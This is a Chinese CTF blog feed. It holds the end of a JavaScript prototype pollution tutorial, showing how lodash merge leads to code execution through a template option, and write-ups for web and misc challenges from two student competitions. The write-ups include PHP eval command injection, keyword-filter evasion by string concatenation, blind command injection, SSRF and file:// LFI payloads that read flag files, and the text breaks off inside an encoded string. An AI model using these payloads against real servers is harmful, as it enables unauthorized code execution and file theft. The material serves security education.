class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;<span class="selector-tag">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="selector-tag">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="function"><span class="title">merge</span><span class="params">(o1, o2)</span></span></span><br><span class="line">console<span class="selector-class">.log</span>(o1<span class="selector-class">.a</span>, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console<span class="selector-class">.log</span>(o3.b)</span><br></pre></td></tr></table></figure><p>结果是，合并虽然成功了，但原型链没有被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = JSON.parse(&#x27;&#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;&#125;&#x27;)</span><br><span class="line"><span class="function"><span class="title">merge</span><span class="params">(o1, o2)</span></span></span><br><span class="line"><span class="function"><span class="title">console</span>.<span class="title">log</span><span class="params">(o1.a, o1.b)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">o3</span> = &#123;&#125;</span></span><br><span class="line"><span class="function"><span class="title">console</span>.<span class="title">log</span><span class="params">(o3.b)</span></span></span><br></pre></td></tr></table></figure><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p><p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p><h2 id="0x05-Code-Breaking-2018-Thejs-分析"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs">0x05 Code-Breaking 2018 Thejs 分析</a></h2><p>我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">这里</a>）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;ejs&#x27;</span>, <span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) &#123; </span><br><span class="line"><span class="comment">// define the template engine</span></span><br><span class="line">    fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.<span class="title function_">template</span>(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = <span class="title function_">compiled</span>(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        data = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">language</span>: data.<span class="property">language</span>, </span><br><span class="line">        <span class="attr">category</span>: data.<span class="property">category</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p><ol><li><code>lodash.template</code> 一个简单的模板引擎</li><li><code>lodash.merge</code> 函数或对象的合并</li></ol><p>其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p><p>而这里的<code>lodash.merge</code>操作实际上就存在原型链污染漏洞。</p><p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。我们看到<code>lodash.template</code>的代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.sourceURL + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">Function</span>(<span class="params">importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source</span>)</span><br><span class="line">  .<span class="title function_">apply</span>(<span class="params">undefined, importsValues</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p><p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p><p>我将带有<code>__proto__</code>的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png" alt="image.png"></a></p><p>可见，我们代码执行成功，返回了id命令的结果。</p><p>整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。</p><p>我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。</p>]]></content>
    
    
    <summary type="html">🥧深入理解 JavaScript Prototype 污染攻击</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3ngx1ng.github.io/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>hubu新星杯实践能力赛模拟赛web-wp</title>
    <link href="https://m3ngx1ng.github.io/posts/98034dd5.html"/>
    <id>https://m3ngx1ng.github.io/posts/98034dd5.html</id>
    <published>2024-11-22T16:00:00.000Z</published>
    <updated>2024-12-02T09:07:20.567Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ez-eval">ez_eval</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hubu</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hubu&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hubu</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><blockquote><p>先进行代码审计，GET传参hubu，并执行命令，没有任何绕过，放开手脚去做</p><p>payload:</p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hubu=<span class="keyword">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);      #直接rce</span><br></pre></td></tr></table></figure><h4 id="rce-level1">rce_level1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>代码审计，发现过滤了关键字flag,system,php。</p><p>使用拼接绕过构造payload:</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=(<span class="string">&#x27;sys&#x27;</span>.<span class="string">&#x27;tem&#x27;</span>)(<span class="built_in">ls</span>);    <span class="comment">#发现目录下没有flag文件</span></span><br><span class="line">?c=(<span class="string">&#x27;sys&#x27;</span>.<span class="string">&#x27;tem&#x27;</span>)(<span class="built_in">cat</span> /f*);   <span class="comment">#发现回显空白</span></span><br></pre></td></tr></table></figure><blockquote><p>不在文件夹里，那可能是在phpinfo里</p></blockquote><blockquote><p>payload：</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">c</span>=phpinfo();</span><br></pre></td></tr></table></figure><blockquote><p>没回显…根据代码的过滤可以知道，应该只过滤了三个关键字，可其实并不只过滤了这三个关键字。</p><p>经过测试，发现有隐藏过滤，比如关键字php，和一些字符如反斜杠\</p><p>最后的payload:</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?c</span>=(<span class="string">&#x27;ph&#x27;</span>.<span class="string">&#x27;pinfo&#x27;</span>)();</span><br></pre></td></tr></table></figure><blockquote><p>在页面中找到flag。</p></blockquote><h4 id="ez-LFI">ez_LFI</h4><blockquote><p>考点：伪协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161059701.png" alt="image-20241124161059701"></p><blockquote><p>先随便传一个，/?url=111</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161148073.png" alt="image-20241124161148073"></p><blockquote><p>代码审计，根据网上查询的parse_url()函数的资料显示：</p><p>解析 URL，返回其组成部分，如下：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>所以必须在传入的url参数中让[host]是localhost。</p><p>然后再用file协议读取flag。</p><p>payload:</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/?url=file:/</span><span class="regexp">/localhost/</span>flag</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{22290581-9558-4405-9c01-368dc660bf6a}</p></blockquote><h2 id="Misc">Misc</h2><h4 id="Cute-Rabbit">Cute Rabbit</h4><blockquote><p>考点：rabbit编码</p></blockquote><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VTJGc<span class="number">2</span>RHVmtYMS<span class="number">91</span>R<span class="symbol">nhkczF5</span>SU<span class="number">1</span>jdit<span class="number">1</span>K<span class="number">3</span><span class="meta">o0</span><span class="symbol">NzFCcDR2</span>aXcrVk<span class="symbol">NNaS9</span>TU<span class="number">1</span>QyZU<span class="number">5</span>EMFU<span class="attr">vSQo=</span></span><br></pre></td></tr></table></figure><blockquote><p>签到题，根据题目提示，是rabbit编码，密文末尾的=表示可能是base64，所以是</p><p>base64 -&gt; rabbit</p><p>HUBUCTF{S0_&lt;u73_R4b6it}</p></blockquote><h4 id="Docker-Forensic">Docker Forensic</h4><blockquote><p>考点：docker的使用</p></blockquote><blockquote><p>根据题目提示，先拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull crpi-i24jskxbbxvfxlzp.cn-hangzhou.personal.cr.aliyuncs.com/st4rry/aliyun:ez_docker_forensic</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124162645328.png" alt="image-20241124162645328"></p><blockquote><p>将镜像压缩到本地</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124164537663.png" alt="image-20241124164537663"></p><blockquote><p>将文件解压到一个目录下，然后切换到该目录。在该目录下有个sha256文件夹，把里面的文件解压</p><p>在tmp中找到password</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165519193.png" alt="image-20241124165519193"></p><blockquote><p>退级，在解压后的一个文件夹里找到flag.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165719701.png" alt="image-20241124165719701"></p><blockquote><p>使用了加盐算法，密钥就是上面的password,进行解密</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171222266.png" alt="image-20241124171222266"></p><blockquote><p>HUBUCTF{1_L0v3_D0ck3r_F0r3ns1c_A}</p></blockquote><h4 id="SpeedMath">SpeedMath</h4><blockquote><p>考点：nc连接，python脚本</p></blockquote><blockquote><p>先用nc连接</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171410644.png" alt="image-20241124171410644"></p><blockquote><p>发现会出现算数题目，但是给你输入的时间很短，所以几乎不可能手工做，直接问AI写脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_arithmetic_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解析并计算算术表达式的结果。</span></span><br><span class="line"><span class="string">    这里假设表达式只包含整数和基本的加减乘除运算。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用eval计算表达式的结果，但注意eval的安全性问题</span></span><br><span class="line">        <span class="comment"># 在实际应用中，应该使用更安全的解析方法</span></span><br><span class="line">        result = <span class="built_in">eval</span>(expression)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error evaluating expression &#x27;<span class="subst">&#123;expression&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nc_connection</span>(<span class="params">host, port</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用Netcat连接到服务器，并自动解答算术题。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 读取服务器发送的数据</span></span><br><span class="line">            data = s.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="comment"># 如果没有接收到数据，可能是连接已经关闭</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Received: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 使用正则表达式匹配算术题目</span></span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;Question \d+: (\d+) ([+\-*/]) (\d+) =&#x27;</span>, data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                num1 = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                operator = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">                num2 = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 构造算术表达式</span></span><br><span class="line">                expression = <span class="string">f&quot;<span class="subst">&#123;num1&#125;</span> <span class="subst">&#123;operator&#125;</span> <span class="subst">&#123;num2&#125;</span>&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 计算正确答案</span></span><br><span class="line">                correct_answer = solve_arithmetic_expression(expression)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> correct_answer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># 将答案发送回服务器（假设服务器期望的是整数答案）</span></span><br><span class="line">                    s.sendall(<span class="string">f&quot;<span class="subst">&#123;correct_answer&#125;</span>\n&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 如果无法计算表达式，则退出循环</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Failed to solve expression.&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果不是算术题目，可能是其他信息或结束信息</span></span><br><span class="line">                <span class="comment"># 这里假设服务器在发送完所有题目后会发送一个非算术题目的消息</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Received non-arithmetic message, possibly final message.&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Final message: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">nc_connection(<span class="string">&#x27;challenge.hubuctf.cn&#x27;</span>, <span class="number">32478</span>)  <span class="comment"># 替换为你的服务器主机名和端口号</span></span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{72e53365-bf9c-48db-8327-83b9c9269e7d}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧hubu新星杯实践能力赛模拟赛web-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3ngx1ng.github.io/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>华科第一届网络安全挑战赛wp</title>
    <link href="https://m3ngx1ng.github.io/posts/4971d2f4.html"/>
    <id>https://m3ngx1ng.github.io/posts/4971d2f4.html</id>
    <published>2024-11-18T16:00:00.000Z</published>
    <updated>2024-12-02T09:05:46.472Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1>华科第一届网络安全挑战赛wp</h1><h2 id="web">web</h2><h4 id="secure-shell">secure_shell</h4><blockquote><p>考点：exec()无回显</p></blockquote><blockquote><p>对于这类题有个很简单的方法，直接将flag写进文件，然后路径读取就行</p></blockquote><blockquote><p>先测试一下能不能执行 cmd=1;sleep 4</p><p>发现反应了4秒，能执行</p><p>然后直接 cat /f* &gt; 1.txt</p><p>最后访问/1.txt路径就行</p></blockquote><h4 id="pyssrf">pyssrf</h4><blockquote><p>考点：ssrf漏洞</p></blockquote><blockquote><p>打开有个提示 /get?site=</p><p>直接file读取flag</p><p>/get?site=file:///flag</p><p>碎碎念：以为很难。。。试了半天。。。。</p></blockquote><h2 id="misc">misc</h2><h4 id="一闪一闪亮晶晶">一闪一闪亮晶晶</h4><blockquote><p>考点：凯撒与base64结合，starry语言</p></blockquote><blockquote><p>根据提示，“凯撒大帝想学习一下Starry语言，你能帮帮他么吗”，一定跟凯撒密码和starry语言有关。</p><p>下载文件，是一串重复度非常高的字符串</p></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzprJDthMjBhJDBhLzBhJDBhJDBhDjthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtLLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJBphLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphDjBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJD4hJDBhJDBhMjBsJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjphLzBhJDBhJDBvJBphJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhDjBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJBphJDBhJDtrJDBhMjBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDB